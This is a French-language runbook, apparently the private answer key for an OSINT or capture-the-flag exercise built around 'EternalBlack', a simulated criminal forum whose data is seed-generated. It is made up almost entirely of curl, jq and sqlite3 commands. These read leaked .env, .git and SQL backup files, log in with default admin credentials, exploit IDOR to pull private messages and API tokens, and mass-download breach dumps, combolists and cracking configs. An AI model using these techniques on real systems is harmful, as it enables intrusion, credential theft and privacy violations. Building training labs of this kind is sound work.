# EternalBlack — OSINT recovery runbook

Comment extraire **chaque type d'IOC** du site, avec les commandes exactes.
Cookbook privé pour l'opérateur — pas destiné au push public.

Toutes les commandes supposent :

```bash
BASE=https://eternalblack.fr   # ou http://127.0.0.1:18080 en local
```

Aucune auth n'est jamais requise : tout ce qui est listé ici est récupérable
par un crawler non-authentifié.

---

## 0. Reconnaissance — cold start depuis 0 connaissance

Ordre recommandé (chaque étape dévoile les URLs des suivantes) :

```bash
# 1. Page d'accueil : contient un commentaire HTML qui leak les paths internes
curl -s $BASE/ | grep -A4 'TODO'

# 2. robots.txt : liste exhaustive de Disallow: pour tous les deep paths
curl -s $BASE/robots.txt

# 3. sitemap.xml : enumeration de toutes les URLs (~180 entries)
curl -s $BASE/sitemap.xml | grep -oP '<loc>\K[^<]+'

# 4. .env leak : DB/AWS/JWT secrets + bloc ROUTE_*
curl -s $BASE/.env

# 5. .git metadata : repo origin + auteurs historiques
curl -s $BASE/.git/config
curl -s $BASE/.git/HEAD
curl -s $BASE/.git/logs/HEAD

# 6. backup.sql : dump partiel table users
curl -s $BASE/backup.sql

# 7. security.txt + humans.txt
curl -s $BASE/.well-known/security.txt
curl -s $BASE/humans.txt

# 8. HTTP headers — fingerprint du serveur
curl -sI $BASE/ | grep -iE '^(server|x-)'

# 9. Admin panel (default creds)
curl -s -c /tmp/cookies.txt -X POST $BASE/admin/login \
  -d 'username=admin&password=admin123'
curl -s -b /tmp/cookies.txt $BASE/admin/debug   # phpinfo + route map

# 10. API config endpoint (unauth secrets leak + route map)
curl -s $BASE/api/v1/config | jq
```

À la fin de cette étape, tu as **toutes** les URLs profondes + les secrets.

---

## 1. Identités, ranks, crédits (15 membres)

```bash
# Liste complète via HTML
curl -s $BASE/panel/roster

# Profil riche par user
curl -s $BASE/panel/member/1

# API : full user list en JSON
curl -s $BASE/api/v1/users | jq

# API : profil étendu (rank, credits, timezone, trust, previous handles, langues)
curl -s $BASE/api/v1/users/1/extra | jq

# Unauth full export
curl -s $BASE/api/v1/admin/users/export | jq '.users | length'

# SQLite dump : tout d'un coup
curl -so /tmp/eb.sqlite $BASE/api/bd/eternalblack.sqlite
sqlite3 /tmp/eb.sqlite "SELECT id, username, role, trust_score, country FROM users;"
```

**Previous usernames** :

```bash
curl -s $BASE/api/bd/previous_usernames.json | jq
sqlite3 /tmp/eb.sqlite "SELECT * FROM previous_usernames;"
```

---

## 2. Aliases cross-plateformes (~70 handles)

```bash
# Dump brut de toutes les aliases en 1 requête
curl -s $BASE/api/bd/aliases.json | jq

# Par user
curl -s $BASE/api/v1/users/1 | jq '.aliases'

# Recherche par alias
curl -s "$BASE/api/v1/pivot?type=alias&q=blackvortex_ops" | jq

# Par plateforme
sqlite3 /tmp/eb.sqlite \
  "SELECT user_id, handle FROM aliases WHERE platform='telegram';"
```

Plateformes présentes : `telegram, jabber, keybase, github, gitlab, twitter, reddit, signal, matrix, mastodon, medium, linkedin, stackoverflow, irc, discord`.

---

## 3. Emails

```bash
# Via backup.sql (dump table users)
curl -s $BASE/backup.sql | grep -oP "'[^']+@[^']+'"

# Via SQLite
curl -s $BASE/api/bd/emails.json | jq '.[].email'

# Via recherche email
curl -s "$BASE/api/v1/pivot?type=email&q=protonmail" | jq

# Via company directory (director emails)
curl -s $BASE/api/v1/companies | jq '.results[].director_emails'

# Via breach sample_emails
curl -s $BASE/api/v1/breaches | jq '.results[] | {name, sample_emails}'

# Via pastes
curl -s $BASE/api/v1/pastes | jq '.results[].body' | grep -oP '[\w.-]+@[\w.-]+'
```

---

## 4. Wallets BTC / ETH / XMR (~75 adresses)

```bash
# Dump table wallets
curl -s $BASE/api/bd/wallets.json | jq
sqlite3 /tmp/eb.sqlite "SELECT * FROM wallets;"

# Recherche par préfixe wallet
curl -s "$BASE/api/v1/pivot?type=wallet&q=bc1q" | jq

# Transactions on-chain
curl -s $BASE/api/v1/transactions | jq

# Filter par wallet
curl -s "$BASE/api/v1/transactions?wallet=bc1qxf9v2e7k3rtn4ydp8cg6l5a2qwzj8fhp7m3k2u" | jq

# Wallets escrow
curl -s $BASE/api/v1/escrow | jq '.results[].wallet'

# Wallets de collecte donation
curl -s $BASE/api/v1/donations | jq '.results[] | {title, collection_btc}'

# Pivot chain multi-hop BFS côté serveur
curl -s "$BASE/api/v1/pivot/chain?start_user_id=1" | jq
```

---

## 5. PGP fingerprints & blocks ASCII armored

```bash
# Fingerprints via backup.sql
curl -s $BASE/backup.sql | grep -oP "[A-F0-9 ]{20,}"

# Via API
curl -s $BASE/api/v1/users/1 | jq '.pgp_fingerprint, .pgp_keyid'

# Download block pour chaque user
for i in $(seq 1 15); do
  curl -so /tmp/pgp_$i.asc $BASE/cdn/pgp/$i.asc
done

# Table dump
sqlite3 /tmp/eb.sqlite "SELECT username, pgp_fpr, pgp_keyid FROM users;"
```

---

## 6. SSH keys

```bash
# 4 users ont une SSH key
sqlite3 /tmp/eb.sqlite "SELECT username, ssh_key FROM users WHERE ssh_key != '';"

# SSH host key SHA256 (infra)
curl -s $BASE/api/v1/config | jq '.ssh_host_key_sha256'
```

---

## 7. IPs historiques + login events

```bash
# IPs déclarées par user
curl -s $BASE/api/v1/users/1/ips | jq

# Toutes les IPs connues (table known_ips)
curl -s $BASE/api/bd/known_ips.json | jq
sqlite3 /tmp/eb.sqlite "SELECT user_id, ip, country, first_seen, last_seen, note FROM known_ips;"

# last_ip_leaked par user (dump users table)
sqlite3 /tmp/eb.sqlite "SELECT username, last_ip FROM users;"

# Login history (events avec tentatives success/fail)
curl -s $BASE/api/v1/users/1/logins | jq
curl -s $BASE/panel/member/1/logins   # version HTML

# IPs d'infra via chat rooms
curl -s $BASE/api/v1/chats/4 | jq '.messages[].body' | grep -oP '\d+\.\d+\.\d+\.\d+'
```

---

## 8. Device fingerprints + User-Agents

```bash
curl -s $BASE/api/v1/users/1/devices | jq
curl -s $BASE/api/bd/devices.json | jq
sqlite3 /tmp/eb.sqlite "SELECT user_id, fingerprint, user_agent, note FROM devices;"
```

---

## 9. Shell companies (9 entités)

```bash
# HTML
curl -s $BASE/entities/registry

# JSON complet
curl -s $BASE/api/v1/companies | jq

# Directors emails (WHOIS-flavor)
curl -s $BASE/api/v1/companies | jq '.results[] | {name, domain, directors, director_emails}'

# SQLite
sqlite3 /tmp/eb.sqlite "SELECT name, reg_number, country, domain FROM companies;"
```

---

## 10. On-chain transactions

```bash
# Toutes les tx
curl -s $BASE/api/v1/transactions | jq

# Filtre wallet
curl -s "$BASE/api/v1/transactions?wallet=hydra9m1xer" | jq

# SQLite
sqlite3 /tmp/eb.sqlite \
  "SELECT hash, from_addr, to_addr, amount_btc, block, ts FROM transactions ORDER BY block;"
```

---

## 11. Private messages (conversations riches)

```bash
# Inbox par user (IDOR — pas d'auth)
curl -s $BASE/api/v1/users/1/inbox | jq
curl -s $BASE/panel/inbox/1   # version HTML

# Thread précis (IDOR sur thread_id)
curl -s $BASE/api/v1/pm/1001 | jq
curl -s $BASE/panel/pm/1001   # HTML

# Tous les threads PM d'un coup
for id in 1001 1002 1003 1004 1005 1006 1007 1008; do
  curl -s $BASE/api/v1/pm/$id
done | jq -s
```

---

## 12. Chat rooms (IDOR)

```bash
# Tous les chats (metadata)
curl -s $BASE/api/v1/chats | jq

# Un chat précis avec l'historique
curl -s $BASE/api/v1/chats/1 | jq '.messages'

# SQLite
sqlite3 /tmp/eb.sqlite \
  "SELECT c.name, m.author_id, m.ts, m.body FROM chat_messages m JOIN chats c ON c.id=m.chat_id;"
```

---

## 13. Donations / fundraisers

```bash
# Liste
curl -s $BASE/api/v1/donations | jq

# Détail avec contributeurs
curl -s $BASE/api/v1/donations/2001 | jq '.contributors'

# HTML
curl -s $BASE/panel/donation/2001

# Extraction relationship graph (qui a donné à qui)
curl -s $BASE/api/v1/donations | jq '.results[] | {title, organizer_id, contributors: [.contributors[].user_id]}'
```

---

## 14. Escrow log

```bash
curl -s $BASE/api/v1/escrow | jq
curl -s $BASE/api/v1/escrow/3001 | jq
curl -s $BASE/panel/escrow
```

---

## 15. Staff meetings

```bash
# Liste
curl -s $BASE/api/v1/meetings | jq

# Détail (topics + decisions + action items)
curl -s $BASE/api/v1/meetings/4003 | jq
curl -s $BASE/staff/meeting/4003
```

---

## 16. Invite tree (relationship graph)

```bash
# Map brute invitee->inviter
curl -s $BASE/api/v1/invite-tree | jq

# HTML rendu (arbre visuel)
curl -s $BASE/staff/invite-tree

# Reconstruire les edges en bash
curl -s $BASE/api/v1/invite-tree | jq -r '.tree | to_entries[] | "\(.value) -> \(.key)"'
```

---

## 17. Moderation log

```bash
curl -s $BASE/api/v1/modlog | jq
curl -s $BASE/staff/modlog

# Filtrer les bans
curl -s $BASE/api/v1/modlog | jq '.results[] | select(.action == "permaban")'
```

---

## 18. Support tickets

```bash
curl -s $BASE/api/v1/tickets | jq
curl -s $BASE/api/v1/tickets/6002 | jq
curl -s $BASE/staff/tickets
```

---

## 19. API tokens personnels (oversharing)

```bash
# Token par user
for i in $(seq 1 15); do
  echo -n "user $i: "
  curl -s $BASE/api/v1/users/$i/token | jq -r .token
done

# Le token admin GOD
curl -s $BASE/api/v1/users/4/token | jq
```

---

## 20. Leaked databases (breach-forum style)

```bash
# Catalogue
curl -s $BASE/api/v1/documents   # 15 PDFs, mais pour DB c'est :
curl -s $BASE/intel/databases     # HTML index

# Un DB précis
curl -s $BASE/intel/database/501

# Télécharger le dump (500 rows)
curl -so /tmp/nexustech.sql $BASE/cdn/leaks/nexustech_corp_2024.sql

# Parser les emails
grep -oP "'[^']+@[^']+'" /tmp/nexustech.sql | sort -u

# Tous les dumps d'un coup
for f in nexustech_corp_2024.sql darknebula_gaming_2025.sql pyrrhic_booter_q3_2025.sql \
         nordicmail_2026.sql telcoprime_2026.csv hotelmesh_2025.csv \
         finsaver_2025.sql ecomnova_2026.csv obsidian_ventures_crm_2026.csv; do
  curl -so /tmp/$f $BASE/cdn/leaks/$f
done
```

---

## 21. Combolists

```bash
curl -s $BASE/intel/combolists   # HTML catalog

# Download tous
for f in combo_mixed_10k_2026.txt combo_usa_hq_50k.txt combo_eu_gaming_25k.txt \
         combo_ob_100k_mixed.txt combo_streaming_hq_15k.txt; do
  curl -so /tmp/$f $BASE/cdn/leaks/$f
done

# Nombre de lignes email:pass par fichier
wc -l /tmp/combo_*.txt

# Extraire emails uniquement
awk -F: '{print $1}' /tmp/combo_mixed_10k_2026.txt | sort -u
```

---

## 22. Cracking configs (OpenBullet / SilverBullet)

```bash
curl -s $BASE/intel/cracking    # HTML

# Download
for f in spotify_ob_v14.loli netflix_ob_v22.loli steam_sb_v5.svb \
         amazon_ob_v11.loli binance_ob_v8_2fa.loli; do
  curl -so /tmp/$f $BASE/cdn/leaks/$f
done

# Parser les target URLs
grep -oP 'url = "[^"]+"' /tmp/spotify_ob_v14.loli
```

---

## 23. Tutorials

```bash
curl -s $BASE/intel/tutorials            # HTML
curl -s $BASE/api/v1/users/7/timeline    # tutos par auteur
```

---

## 24. Pastes

```bash
curl -s $BASE/api/v1/pastes | jq

# Contenu d'une paste
curl -s $BASE/api/v1/pastes/302 | jq -r .body   # .env leak

# Parser les secrets
curl -s $BASE/api/v1/pastes/302 | jq -r .body | grep -E '^[A-Z_]+='
```

---

## 25. Historical breaches

```bash
curl -s $BASE/api/v1/breaches | jq
curl -s $BASE/api/v1/breaches | jq '.results[].sample_emails | flatten | .[]'
```

---

## 26. PDFs avec metadata spoofée

```bash
# Index
curl -s $BASE/cdn/archive

# Download tous
for f in invoice_nexustech_2026Q1 kyc_blackvortex_passport contract_hydra9_mixing_sla \
         audit_obsidian_ventures_2025 malware_analysis_valkyrie_forge_v9 \
         phishing_kit_manual_ca_v7 whitepaper_minotaur_lpe cve_draft_aegean_research \
         financial_kyoto_cyber_2025 sla_pyrrhic_booter forum_rules_v3 escrow_policy_2026 \
         lemanique_invoice_2025q4 cairo_digital_payroll_2025 cayman_proxy_network_map; do
  curl -so /tmp/$f.pdf $BASE/cdn/archive/$f.pdf
done

# Extraire la metadata
exiftool /tmp/*.pdf
# Ou champ par champ
exiftool -Author -Title -Creator -Producer -CreateDate -ModifyDate /tmp/invoice_nexustech_2026Q1.pdf

# Extraire le text-layer (contient wallets + IOCs)
pdftotext /tmp/kyc_blackvortex_passport.pdf -
```

---

## 27. Secrets / creds

```bash
# .env
curl -s $BASE/.env

# Config JSON
curl -s $BASE/api/v1/config | jq

# Admin debug page (phpinfo + route map)
curl -s $BASE/admin/debug

# Admin logs (unauth)
curl -s $BASE/api/v1/admin/logs | jq

# JWT sample dans paste
curl -s $BASE/api/v1/pastes/304 | jq -r .body

# Creds backup leak
curl -s $BASE/api/v1/pastes/308 | jq -r .body
```

---

## 28. SQLite + tables CSV/JSON/XML

```bash
# Full SQLite (92 KB)
curl -so /tmp/eb.sqlite $BASE/api/bd/eternalblack.sqlite
sqlite3 /tmp/eb.sqlite ".tables"
sqlite3 /tmp/eb.sqlite ".schema users"

# Une table précise dans tous les formats
curl -s $BASE/api/bd/users.csv
curl -s $BASE/api/bd/users.json
curl -s $BASE/api/bd/users.xml

# Export massif de toutes les tables en JSON
for t in users emails aliases previous_usernames known_ips devices wallets \
         companies listings reviews threads replies pastes breaches \
         breach_samples transactions vouches chats chat_messages; do
  curl -so /tmp/eb_$t.json $BASE/api/bd/$t.json
done
```

---

## 29. Git metadata

```bash
curl -s $BASE/.git/config          # origin + user.email
curl -s $BASE/.git/HEAD             # ref branch
curl -s $BASE/.git/logs/HEAD        # commits avec authors + ts
```

---

# Pivot chains — cookbook pas à pas

## Chaîne A : du domaine au réseau laundering complet

```bash
BASE=https://eternalblack.fr

# 1. Trouve les routes
curl -s $BASE/robots.txt | grep Disallow

# 2. Fetch un profil
curl -s $BASE/panel/member/1 -o /tmp/bv.html
grep -oP 'bc1q[a-z0-9]+' /tmp/bv.html     # wallet BV

# 3. Lookup transactions du wallet
curl -s "$BASE/api/v1/transactions?wallet=bc1qxf9v2e7k3rtn4ydp8cg6l5a2qwzj8fhp7m3k2u" | jq

# 4. Pivot chain serveur-side
curl -s "$BASE/api/v1/pivot/chain?start_user_id=1" | jq

# 5. Lire la conversation privée où ils coordonnent le mixing
curl -s $BASE/api/v1/pm/1001 | jq '.messages[] | {from, body}'

# 6. Voir la société qui sert de façade OTC
curl -s $BASE/api/v1/companies | jq '.results[] | select(.name == "Lémanique Consulting Sàrl")'

# 7. Récupérer le PDF facture avec metadata
curl -so /tmp/lemanique.pdf $BASE/cdn/archive/lemanique_invoice_2025q4.pdf
exiftool -Author -Title -CreateDate /tmp/lemanique.pdf
```

## Chaîne B : alias → platforms → breach

```bash
# 1. Commence avec un handle Telegram trouvé dans un leak
HANDLE="blackvortex_ops"

# 2. Pivot alias
curl -s "$BASE/api/v1/pivot?type=alias&q=$HANDLE" | jq '.results[].id'
# → user_id 1

# 3. Dump toutes les aliases du user
curl -s $BASE/api/v1/users/1 | jq '.aliases'

# 4. Extract emails associés
curl -s $BASE/api/v1/users/1 | jq '.emails'

# 5. Cross-check dans les breaches
curl -s $BASE/api/v1/breaches | jq '.results[] | select(.sample_emails | any(. | contains("nexustech")))'

# 6. Download breach dump
curl -so /tmp/nexus.sql $BASE/cdn/leaks/nexustech_corp_2024.sql
grep -oP "'[^']+@nexustech[^']*'" /tmp/nexus.sql
```

## Chaîne C : IP → user → device → login pattern

```bash
# 1. IP trouvée dans un log externe
IP="185.244.25.173"

# 2. Cherche dans /backup.sql
curl -s $BASE/backup.sql | grep "$IP"
# → BlackVortex (user 1)

# 3. Historique complet des IPs de ce user
curl -s $BASE/api/v1/users/1/ips | jq

# 4. Logins avec device fingerprints
curl -s $BASE/api/v1/users/1/logins | jq

# 5. Cross-match avec les configs d'autres users
sqlite3 /tmp/eb.sqlite "SELECT user_id, ip FROM known_ips WHERE ip='$IP';"
```

## Chaîne D : donation → cluster d'influence

```bash
# 1. Fetch une donation active
curl -s $BASE/api/v1/donations/2001 | jq '.contributors[].user_id'

# 2. Build le graph des donateurs
curl -s $BASE/api/v1/donations | jq -r '
  .results[] | .contributors[] | .user_id
' | sort | uniq -c | sort -rn

# 3. Croiser avec invite-tree
curl -s $BASE/api/v1/invite-tree | jq
```

## Chaîne E : staff meeting → predict bans

```bash
# 1. Lire les PVs pour détecter les mentions de users problématiques
curl -s $BASE/api/v1/meetings | jq '.results[] | {date, topics, decisions}'

# 2. Matcher avec le modlog
curl -s $BASE/api/v1/modlog | jq '.results[] | select(.action == "permaban")'

# 3. Voir quel user a été banni et comparer avec le meeting qui l'a décidé
```

---

**Volumes attendus après harvest complet :**

- ~200 fichiers totalisant 2-3 MB
- ~300-400 IOCs atomiques uniques
- ~75 wallets distincts
- ~70 aliases cross-platforms
- ~25 emails
- ~35 IPs historiques
- 15 PGP fingerprints
- 9 shell companies
- 15 PDFs metadata-spoofés
- 19 tables SQLite
- ~50 messages privés extraits
- ~40 login events
- ~20 device fingerprints

Tous reproductibles déterministiquement depuis `/cdn/leaks/*` (générés par seed).
